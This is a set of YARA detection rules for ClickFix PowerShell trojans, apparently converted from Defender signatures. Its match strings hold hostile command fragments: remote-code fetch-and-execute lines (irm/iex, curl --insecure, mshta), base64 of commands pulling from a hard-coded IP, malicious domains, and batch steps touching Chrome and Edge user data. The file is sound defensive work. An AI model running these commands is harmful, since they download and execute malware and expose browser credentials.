rule Trojan_PowerShell_ClickFix_AB_2147948541_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:PowerShell/ClickFix.AB!MTB"
        threat_id = "2147948541"
        type = "Trojan"
        platform = "PowerShell: "
        family = "ClickFix"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_CMDHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "invoke-webrequest" wide //weight: 1
        $x_1_2 = "iwr" wide //weight: 1
        $x_1_3 = "-useb" wide //weight: 1
        $x_10_4 = ".com/run/" wide //weight: 10
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_PowerShell_ClickFix_SVI_2147977853_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:PowerShell/ClickFix.SVI"
        threat_id = "2147977853"
        type = "Trojan"
        platform = "PowerShell: "
        family = "ClickFix"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_CMDHSTR_EXT"
        threshold = "50"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "powershell" wide //weight: 10
        $x_10_2 = "[scriptblock]::create((" wide //weight: 10
        $x_10_3 = "curl.exe" wide //weight: 10
        $x_10_4 = "--insecure -s" wide //weight: 10
        $x_10_5 = "http" wide //weight: 10
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_PowerShell_ClickFix_SVJ_2147977854_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:PowerShell/ClickFix.SVJ"
        threat_id = "2147977854"
        type = "Trojan"
        platform = "PowerShell: "
        family = "ClickFix"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_CMDHSTR_EXT"
        threshold = "50"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "[powershell]::create()" wide //weight: 10
        $x_10_2 = ".addscript((curl.exe" wide //weight: 10
        $x_10_3 = "--insecure -s" wide //weight: 10
        $x_10_4 = ".invoke()" wide //weight: 10
        $x_10_5 = "http" wide //weight: 10
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_PowerShell_ClickFix_SVL_2147978583_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:PowerShell/ClickFix.SVL"
        threat_id = "2147978583"
        type = "Trojan"
        platform = "PowerShell: "
        family = "ClickFix"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_CMDHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {70 00 6f 00 77 00 65 00 72 00 73 00 68 00 65 00 6c 00 6c 00 [0-16] 20 00 2d 00 77 00 20 00 68 00 [0-16] 69 00 72 00 6d 00}  //weight: 1, accuracy: Low
        $x_1_2 = "|powershell -w h" wide //weight: 1
        $x_1_3 = "gg.ps1" wide //weight: 1
        $x_3_4 = {25 00 63 00 6f 00 6d 00 73 00 70 00 65 00 63 00 25 00 22 00 20 00 2f 00 63 00 20 00 73 00 74 00 61 00 72 00 74 00 20 00 22 00 22 00 20 00 2f 00 6d 00 69 00 6e 00 20 00 66 00 6f 00 72 00 20 00 2f 00 66 00 20 00 22 00 64 00 65 00 6c 00 69 00 6d 00 73 00 3d 00 40 00 22 00 [0-255] 64 00 6f 00 20 00 25 00 74 00}  //weight: 3, accuracy: Low
        $x_3_5 = {63 00 6f 00 6d 00 73 00 70 00 65 00 63 00 25 00 20 00 2f 00 63 00 20 00 73 00 74 00 61 00 72 00 74 00 20 00 22 00 22 00 20 00 2f 00 6d 00 69 00 6e 00 20 00 66 00 6f 00 72 00 20 00 2f 00 66 00 20 00 22 00 64 00 65 00 6c 00 69 00 6d 00 73 00 3d 00 40 00 22 00 [0-255] 64 00 6f 00 20 00 25 00 74 00}  //weight: 3, accuracy: Low
        $x_3_6 = "start \"\" /min cmd /d /v:on /q /c \"cd /d %temp%" wide //weight: 3
        $x_3_7 = "('where *wershell')do start /min" wide //weight: 3
        $x_3_8 = {25 00 63 00 6f 00 6d 00 73 00 70 00 65 00 63 00 25 00 20 00 2f 00 63 00 20 00 73 00 74 00 61 00 72 00 74 00 20 00 22 00 22 00 [0-80] 2f 00 6d 00 5e 00 69 00 5e 00 6e 00 20 00 66 00 6f 00 72 00 20 00 2f 00 66 00 20 00 22 00 64 00 65 00 6c 00 69 00 6d 00 73 00 3d 00}  //weight: 3, accuracy: Low
        $x_3_9 = {25 00 63 00 6f 00 6d 00 73 00 70 00 65 00 63 00 25 00 20 00 2f 00 63 00 20 00 73 00 74 00 61 00 72 00 74 00 20 00 22 00 22 00 20 00 2f 00 6d 00 69 00 6e 00 20 00 25 00 63 00 6f 00 6d 00 73 00 70 00 65 00 63 00 25 00 20 00 2f 00 63 00 20 00 25 00 63 00 6f 00 6d 00 73 00 70 00 65 00 63 00 25 00 20 00 2f 00 76 00 3a 00 6f 00 6e 00 20 00 2f 00 63 00 [0-48] 25 00 6c 00 6f 00 63 00 61 00 6c 00 61 00 70 00 70 00 64 00 61 00 74 00 61 00 25 00 [0-128] 2e 00 68 00 74 00 61 00}  //weight: 3, accuracy: Low
        $x_3_10 = {69 00 72 00 6d 00 20 00 31 00 34 00 35 00 30 00 30 00 30 00 33 00 32 00 30 00 37 00 2f 00 [0-48] 24 00 65 00 6e 00 76 00 3a 00 74 00 65 00 6d 00 70 00}  //weight: 3, accuracy: Low
        $x_3_11 = {69 00 72 00 6d 00 20 00 33 00 39 00 32 00 30 00 37 00 33 00 36 00 39 00 36 00 2f 00 [0-48] 24 00 65 00 6e 00 76 00 3a 00 74 00 65 00 6d 00 70 00}  //weight: 3, accuracy: Low
        $x_3_12 = {69 00 72 00 6d 00 20 00 33 00 35 00 33 00 38 00 37 00 35 00 31 00 39 00 2f 00 [0-48] 24 00 65 00 6e 00 76 00 3a 00 74 00 65 00 6d 00 70 00}  //weight: 3, accuracy: Low
        $x_3_13 = {69 00 72 00 6d 00 20 00 31 00 36 00 31 00 34 00 37 00 33 00 33 00 33 00 39 00 33 00 2f 00 [0-48] 24 00 65 00 6e 00 76 00 3a 00 74 00 65 00 6d 00 70 00}  //weight: 3, accuracy: Low
        $x_3_14 = {69 00 72 00 6d 00 20 00 33 00 39 00 32 00 30 00 37 00 33 00 35 00 36 00 30 00 2f 00 02 00 30 00 24 00 65 00 6e 00 76 00 3a 00 74 00 65 00 6d 00 70 00}  //weight: 3, accuracy: Low
        $x_3_15 = "irm 1476085201/" wide //weight: 3
        $x_3_16 = ".((write ie)+'zx'[1])" wide //weight: 3
        $x_3_17 = "LgAoACgAdwByAGkAdABlACAAaQBlACkAKwAnAHoAeAAnAFsAMQBdACkAKABpAHIAbQAgADEANAA3ADYAMAA4ADUAMgAwADEALw" ascii //weight: 3
        $x_3_18 = {66 00 6f 00 72 00 20 00 2f 00 72 00 20 00 22 00 [0-64] 5c 00 67 00 6f 00 6f 00 67 00 6c 00 65 00 5c 00 63 00 68 00 72 00 6f 00 6d 00 65 00 5c 00 75 00 73 00 65 00 72 00 20 00 64 00 61 00 74 00 61 00 22 00 [0-32] 69 00 6e 00 20 00 28 00 66 00 5f 00 2a 00 29 00 20 00 64 00 6f 00 20 00 40 00 69 00 66 00 20 00 25 00 7e 00 7a 00 [0-4] 3d 00 3d 00 [0-16] 72 00 65 00 6e 00 20 00 22 00 [0-32] 2e 00 76 00 62 00 73 00 [0-16] 77 00 73 00 63 00 72 00 69 00 70 00 74 00 20 00 [0-64] 2e 00 76 00 62 00 73 00}  //weight: 3, accuracy: Low
        $x_3_19 = {66 00 6f 00 72 00 20 00 2f 00 72 00 20 00 22 00 [0-64] 5c 00 6d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 5c 00 65 00 64 00 67 00 65 00 5c 00 75 00 73 00 65 00 72 00 20 00 64 00 61 00 74 00 61 00 22 00 [0-32] 69 00 6e 00 20 00 28 00 66 00 5f 00 2a 00 29 00 20 00 64 00 6f 00 20 00 40 00 69 00 66 00 20 00 25 00 7e 00 7a 00 [0-4] 3d 00 3d 00 [0-16] 72 00 65 00 6e 00 20 00 22 00 [0-32] 2e 00 76 00 62 00 73 00 [0-16] 77 00 73 00 63 00 72 00 69 00 70 00 74 00 20 00 [0-64] 2e 00 76 00 62 00 73 00}  //weight: 3, accuracy: Low
        $x_3_20 = {66 00 6f 00 72 00 20 00 2f 00 72 00 20 00 22 00 [0-64] 5c 00 67 00 6f 00 6f 00 67 00 6c 00 65 00 5c 00 63 00 68 00 72 00 6f 00 6d 00 65 00 5c 00 75 00 73 00 65 00 72 00 20 00 64 00 61 00 74 00 61 00 22 00 [0-32] 69 00 6e 00 20 00 28 00 66 00 5f 00 2a 00 29 00 20 00 64 00 6f 00 20 00 40 00 69 00 66 00 20 00 25 00 7e 00 7a 00 [0-4] 3d 00 3d 00 [0-16] 63 00 6f 00 70 00 79 00 20 00 22 00 [0-64] 2e 00 76 00 62 00 73 00 [0-64] 77 00 73 00 63 00 72 00 69 00 70 00 74 00 20 00 [0-64] 2e 00 76 00 62 00 73 00}  //weight: 3, accuracy: Low
        $x_3_21 = {66 00 6f 00 72 00 20 00 2f 00 72 00 20 00 22 00 [0-64] 5c 00 6d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 5c 00 65 00 64 00 67 00 65 00 5c 00 75 00 73 00 65 00 72 00 20 00 64 00 61 00 74 00 61 00 22 00 [0-32] 69 00 6e 00 20 00 28 00 66 00 5f 00 2a 00 29 00 20 00 64 00 6f 00 20 00 40 00 69 00 66 00 20 00 25 00 7e 00 7a 00 [0-4] 3d 00 3d 00 [0-16] 63 00 6f 00 70 00 79 00 20 00 22 00 [0-64] 2e 00 76 00 62 00 73 00 [0-64] 77 00 73 00 63 00 72 00 69 00 70 00 74 00 20 00 [0-64] 2e 00 76 00 62 00 73 00}  //weight: 3, accuracy: Low
        $x_3_22 = {69 00 72 00 6d 00 20 00 27 00 68 00 74 00 74 00 70 00 [0-255] 2d 00 75 00 73 00 65 00 72 00 61 00 67 00 65 00 6e 00 74 00 20 00 27 00 77 00 75 00 61 00 2f 00 [0-32] 2d 00 68 00 65 00 61 00 64 00 65 00 72 00 73 00 20 00 40 00 7b 00 27 00 78 00 2d 00 77 00 75 00 61 00 27 00 3d 00 27 00 [0-128] 29 00 7c 00 [0-8] 69 00 65 00 78 00}  //weight: 3, accuracy: Low
        $x_3_23 = "$env:tmp;irm 2549127135/" wide //weight: 3
        $x_3_24 = {25 00 74 00 65 00 6d 00 70 00 25 00 [0-255] 68 00 74 00 74 00 70 00 73 00 3a 00 2f 00 2f 00 63 00 6c 00 6f 00 75 00 62 00 66 00 6c 00 61 00 72 00 65 00 2e 00 6e 00 65 00 74 00 2f 00}  //weight: 3, accuracy: Low
        $x_3_25 = "https://gfisoda.biz/" wide //weight: 3
        $x_3_26 = "SW52b2tlLVdlYlJlcXVlc3QgJ2h0dHA6Ly8xNjYuMS44OS45MS96YXAvJyAtVXNlQmFzaWNQYXJzaW5nIHwgSW52b2tlLUV4cHJlc3Npb24=" wide //weight: 3
        $x_3_27 = "SW52b2tlLVdlYlJlcXVlc3QgJ2h0dHA6Ly8xNjYuMS44OS45MS9fLycgLVVzZUJhc2ljUGFyc2luZyB8IEludm9rZS1FeHByZXNzaW9u" wide //weight: 3
        $x_3_28 = "aQByAG0AIABoAHQAdABwADoALwAvADEANgA2AC4AMQAuADgAOQAuADkAMQAvAF8AfABpAGUAeAA=" wide //weight: 3
        $x_3_29 = "aQByAG0AIABoAHQAdABwADoALwAvADEANgA2AC4AMQAuADgAOQAuADkAMQAvAHoAYQBwAHwAaQBlAHgA" wide //weight: 3
        $x_3_30 = {6d 00 73 00 68 00 74 00 61 00 [0-48] 68 00 74 00 74 00 70 00 73 00 3a 00 2f 00 2f 00 31 00 39 00 30 00 32 00 2d 00 63 00 66 00 2e 00 63 00 6f 00 6d 00}  //weight: 3, accuracy: Low
        $x_3_31 = {6d 00 73 00 68 00 74 00 61 00 [0-48] 68 00 74 00 74 00 70 00 73 00 3a 00 2f 00 2f 00 [0-8] 2d 00 63 00 66 00 2e 00 63 00 6f 00 6d 00}  //weight: 3, accuracy: Low
        $x_3_32 = "4fb-ff/c19e1173-a40b-4198-b705-b85466f6cde0/119-73c4846d6ec9" wide //weight: 3
        $x_3_33 = {69 00 72 00 6d 00 [0-16] 73 00 74 00 65 00 61 00 6d 00 2e 00 72 00 75 00 6e 00 [0-16] 69 00 65 00 78 00}  //weight: 3, accuracy: Low
        $x_3_34 = {24 00 65 00 6e 00 76 00 3a 00 74 00 65 00 6d 00 70 00 [0-255] 69 00 77 00 72 00 [0-255] 76 00 6f 00 6c 00 61 00 6e 00 74 00 65 00 6f 00 6d 00 61 00 6c 00 65 00 74 00 61 00 2e 00 63 00 6c 00}  //weight: 3, accuracy: Low
        $x_3_35 = {27 00 6d 00 73 00 78 00 6d 00 6c 00 32 00 2e 00 78 00 6d 00 6c 00 68 00 74 00 74 00 70 00 [0-255] 69 00 65 00 78 00 28 00 67 00 63 00 20 00 24 00 65 00 6e 00 76 00 3a 00 74 00 6d 00 70 00 [0-48] 72 00 6d 00 20 00 24 00 65 00 6e 00 76 00 3a 00 74 00 6d 00 70 00}  //weight: 3, accuracy: Low
        $x_3_36 = "irm c\"d\"n.jsdelivr.net/g\"h\"/" wide //weight: 3
        $x_3_37 = "holtandberyl.com/prw" wide //weight: 3
        $x_3_38 = "power!power! -nop -c iex(irm !a!!b!!c!!d!)" wide //weight: 3
        $x_3_39 = "do set data=!data!!code:~%t,1!)" wide //weight: 3
        $x_3_40 = "do set item=!item!!code:~%i,1!)" wide //weight: 3
        $x_3_41 = "do set item=!item!!note:~%t,1!)" wide //weight: 3
        $x_3_42 = "do set text=!text!!note:~%t,1!)" wide //weight: 3
        $x_3_43 = "do set body=!body!!ref:~%n,1!)" wide //weight: 3
        $x_3_44 = "do set Text=!Text!!ref:~%n,1!)" wide //weight: 3
        $x_3_45 = {64 00 6f 00 20 00 73 00 65 00 74 00 20 00 69 00 74 00 65 00 6d 00 3d 00 21 00 69 00 74 00 65 00 6d 00 21 00 21 00 6d 00 61 00 72 00 6b 00 3a 00 7e 00 25 00 [0-8] 2c 00 31 00 21 00 29 00}  //weight: 3, accuracy: Low
        $x_3_46 = {64 00 6f 00 20 00 73 00 65 00 74 00 20 00 74 00 65 00 78 00 74 00 3d 00 21 00 74 00 65 00 78 00 74 00 21 00 21 00 63 00 6f 00 64 00 65 00 3a 00 7e 00 25 00 [0-16] 2c 00 31 00 21 00 29 00}  //weight: 3, accuracy: Low
        $x_3_47 = {25 00 6c 00 6f 00 63 00 61 00 6c 00 61 00 70 00 70 00 64 00 61 00 74 00 61 00 25 00 5c 00 [0-128] 64 00 6f 00 20 00 40 00 69 00 66 00 20 00 25 00 7e 00 7a 00 66 00 3d 00 3d 00 [0-48] 63 00 6f 00 70 00 79 00 20 00 22 00 25 00 66 00 22 00 20 00 25 00 74 00 65 00 6d 00 70 00 25 00 5c 00 [0-48] 77 00 73 00 63 00 72 00 69 00 70 00 74 00 [0-48] 2e 00 76 00 62 00 73 00}  //weight: 3, accuracy: Low
        $x_3_48 = {5b 00 6e 00 65 00 74 00 2e 00 73 00 65 00 72 00 76 00 69 00 63 00 65 00 70 00 6f 00 69 00 6e 00 74 00 6d 00 61 00 6e 00 61 00 67 00 65 00 72 00 5d 00 3a 00 3a 00 73 00 65 00 63 00 75 00 72 00 69 00 74 00 79 00 70 00 72 00 6f 00 74 00 6f 00 63 00 6f 00 6c 00 3d 00 5b 00 6e 00 65 00 74 00 2e 00 73 00 65 00 63 00 75 00 72 00 69 00 74 00 79 00 70 00 72 00 6f 00 74 00 6f 00 63 00 6f 00 6c 00 74 00 79 00 70 00 65 00 5d 00 3a 00 3a 00 74 00 6c 00 73 00 31 00 32 00 3b 00 [0-255] 2d 00 75 00 73 00 65 00 62 00 61 00 73 00 69 00 63 00 70 00 61 00 72 00 73 00 69 00 6e 00 67 00 20 00 2d 00 6f 00 75 00 74 00 66 00 69 00 6c 00 65 00 20 00 24 00 65 00 6e 00 76 00 3a 00 74 00 65 00 6d 00 70 00 5c 00 31 00 32 00 33 00 2e 00 70 00 73 00 31 00}  //weight: 3, accuracy: Low
        $x_3_49 = {73 00 74 00 61 00 72 00 74 00 20 00 22 00 22 00 20 00 2f 00 6d 00 5e 00 69 00 5e 00 6e 00 20 00 66 00 6f 00 72 00 20 00 2f 00 66 00 20 00 22 00 64 00 65 00 6c 00 69 00 6d 00 73 00 3d 00 40 00 22 00 [0-16] 66 00 5e 00 5e 00 69 00 5e 00 5e 00 6e 00 5e 00 5e 00 67 00 5e 00 5e 00 65 00 5e 00 5e 00 72 00 [0-128] 27 00 29 00 20 00 64 00 6f 00 20 00}  //weight: 3, accuracy: Low
        $x_3_50 = {73 00 74 00 61 00 72 00 74 00 20 00 22 00 22 00 20 00 2f 00 6d 00 5e 00 69 00 5e 00 6e 00 20 00 66 00 6f 00 72 00 20 00 2f 00 66 00 20 00 22 00 64 00 65 00 6c 00 69 00 6d 00 73 00 3d 00 22 00 [0-16] 28 00 27 00 77 00 68 00 65 00 72 00 65 00 20 00 66 00 69 00 6e 00 67 00 65 00 72 00 27 00 29 00 20 00 64 00 6f 00 20 00 66 00 6f 00 72 00 20 00 2f 00 66 00 20 00 22 00 64 00 65 00 6c 00 69 00 6d 00 73 00 3d 00 22 00 [0-128] 64 00 6f 00 20 00 40 00 25 00}  //weight: 3, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule Trojan_PowerShell_ClickFix_SVM_2147978684_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:PowerShell/ClickFix.SVM"
        threat_id = "2147978684"
        type = "Trojan"
        platform = "PowerShell: "
        family = "ClickFix"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_CMDHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {70 00 6f 00 77 00 65 00 72 00 73 00 68 00 65 00 6c 00 6c 00 [0-16] 20 00 2d 00 77 00 20 00 68 00 [0-16] 69 00 72 00 6d 00}  //weight: 1, accuracy: Low
        $x_1_2 = "|powershell -w h" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_PowerShell_ClickFix_SVM_2147978684_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:PowerShell/ClickFix.SVM"
        threat_id = "2147978684"
        type = "Trojan"
        platform = "PowerShell: "
        family = "ClickFix"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_CMDHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "powershell.exe" wide //weight: 1
        $x_10_2 = {69 00 72 00 6d 00 20 00 29 15 15 00 2f 00 29 04 04 00 [0-48] 24 00 65 00 6e 00 76 00 3a 00 74 00 65 00 6d 00 70 00}  //weight: 10, accuracy: Low
        $x_10_3 = {69 00 72 00 6d 00 20 00 [0-48] 2f 00 [0-48] 2d 00 6f 00 75 00 74 00 66 00 69 00 6c 00 65 00 20 00 24 00 65 00 6e 00 76 00 3a 00 74 00 65 00 6d 00 70 00 [0-48] 2d 00 75 00 73 00 65 00 62 00 61 00 73 00 69 00 63 00 70 00 61 00 72 00 73 00 69 00 6e 00 67 00 [0-48] 24 00 65 00 6e 00 76 00 3a 00 74 00 65 00 6d 00 70 00 5c 00}  //weight: 10, accuracy: Low
        $x_10_4 = {24 00 65 00 6e 00 76 00 3a 00 74 00 6d 00 70 00 3b 00 69 00 72 00 6d 00 20 00 29 15 15 00 2f 00 29 10 10 00 [0-48] 6d 00 73 00 69 00 65 00 78 00 65 00 63 00 20 00 2f 00 69 00}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_PowerShell_ClickFix_SVN_2147978685_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:PowerShell/ClickFix.SVN"
        threat_id = "2147978685"
        type = "Trojan"
        platform = "PowerShell: "
        family = "ClickFix"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_CMDHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {70 00 6f 00 77 00 65 00 72 00 73 00 68 00 65 00 6c 00 6c 00 [0-16] 69 00 72 00 6d 00 20 00 [0-80] 7c 00 70 00 6f 00 77 00 65 00 72 00 73 00 68 00 65 00 6c 00 6c 00 [0-16] 2d 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

